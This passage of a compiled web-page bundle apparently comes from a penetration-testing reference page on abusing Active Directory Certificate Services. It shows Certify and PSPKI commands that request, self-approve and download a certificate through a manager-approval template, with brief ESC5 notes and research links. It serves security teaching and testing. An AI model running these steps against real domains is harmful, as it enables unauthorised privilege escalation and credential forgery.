PSPKI is used). PSPKI is a PowerShell module used to "simplify various PKI and AD CS management tasks".')],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 1. Request a certificate that requires manager approval with Certify")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:CA.domain.local\\CA "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:ApprovalNeeded")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"...")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"["),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"*"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"] Request ID : "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 2. Install PSPKI on a controlled Windows host")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Install-Module"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Name PSPKI")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Import-Module"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," PSPKI")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 3. Approve the pending request with PSPKI")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"PSPKI "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},">"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Get-CertificationAuthority"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ComputerName CA.domain.local "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Get-PendingRequest"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"RequestID "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Approve-CertificateRequest")]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# 4. Download the certificate with Certify")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," download "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:CA.domain.local\\CA "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"id:"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"1")])])])],-1)])),_:1})]),_:1}),e[9]||(e[9]=h('<div class="warning custom-block"><p></p><p>If sensitive rights are identified, creativity will be the best ally. Not much public tooling is available at the time of writing (October 21st, 2021).</p><p>Currently, the best resources for manually abusing this are</p><ul><li><a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noreferrer">the whitepaper</a> (PDF)</li><li><a href="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" target="_blank" rel="noreferrer">Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more! (by Olivier Lyak)</a></li><li><a href="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates" target="_blank" rel="noreferrer">Abusing weak ACL on Certificate Templates (by daemon0cc0re)</a></li><li><a href="https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4" target="_blank" rel="noreferrer">AD-CS The Certified Pre Owned Attacks (by HTTP418)</a></li><li><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7" target="_blank" rel="noreferrer">AD CS Abuse (by snovvcrash)</a></li></ul></div><h3 id="other-objects-esc5" tabindex="-1">Other objects (ESC5) <a class="header-anchor" href="#other-objects-esc5" aria-label="Permalink to &quot;Other objects (ESC5)&quot;">​</a></h3><p>This can be enumerated and abused like regular AD access control abuses. Once control over an AD-CS-related is gained, creativity will be the attacker&#39;s best ally.</p><div class="tip custom-block"><p>Read the <a href="./../dacl/">DACL abuse</a> article for more insight.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noreferrer">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a></p><p><a href="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" target="_blank" rel="noreferrer">https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6</a></p><p><a href="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment#section-3-6" target="_blank" rel="noreferrer">https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment#section-3-6</a></p><p><a href="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates" target="_blank" rel="noreferrer">https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates</a></p>',9))])}const m=k(d,[["render",c]]);export{f as __pageData,m as default};
